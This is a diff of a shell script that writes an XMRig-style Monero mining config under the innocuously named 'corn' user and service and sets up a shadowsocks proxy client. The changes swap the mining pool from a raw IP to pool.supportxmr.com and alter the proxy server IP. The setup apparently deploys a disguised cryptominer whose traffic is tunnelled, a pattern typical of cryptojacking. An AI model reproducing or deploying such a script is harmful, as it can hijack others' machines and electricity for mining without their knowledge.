@@ -58,10 +58,10 @@ cat > /home/corn/config.json <<EOL
     "cpu": {
         "enabled": true,
         "huge-pages": true,
-        "huge-pages-jit": true,
+        "huge-pages-jit": false,
         "hw-aes": null,
         "priority": null,
-        "memory-pool": true,
+        "memory-pool": false,
         "yield": true,
         "max-threads-hint": 100,
         "asm": true,
@@ -92,17 +92,17 @@ cat > /home/corn/config.json <<EOL
         {
             "algo": "rx/0",
             "coin": null,
-            "url": "3.34.138.59:3333",
+            "url": "pool.supportxmr.com:443",
             "user": "43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd",
-            "pass": "twcc",
+            "pass": "x",
             "rig-id": null,
             "nicehash": true,
             "keepalive": true,
             "enabled": true,
-            "tls": false,
+            "tls": true,
             "tls-fingerprint": null,
             "daemon": false,
-            "socks5": "127.0.0.1:1080",
+            "socks5": "null",
             "self-select": null,
             "submit-to-origin": false
         }
@@ -247,7 +247,7 @@ cat >/etc/shadowsocks-libev/config.json <<EOL
 
 {
 
-    "server": "3.34.138.59",
+    "server": "114.29.237.94",
 
     "server_port": 443,
 
@@ -308,4 +308,3 @@ sudo systemctl start ss-local.service
 
 
 sudo systemctl start corn.service
-
